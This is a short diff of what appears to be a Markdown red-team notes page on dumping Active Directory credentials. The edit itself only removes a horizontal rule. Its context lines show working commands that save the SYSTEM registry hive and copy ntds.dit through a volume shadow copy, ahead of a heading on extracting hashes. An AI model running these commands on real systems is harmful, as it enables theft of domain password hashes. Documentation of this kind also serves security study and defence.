@@ -112,7 +112,7 @@ reg.exe save hklm\system c:\exfil\system.bak
 esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 ```
 
-***
+
 
 ## <mark style="color:red;">Extracting hashes from NTDS.dit</mark>
 
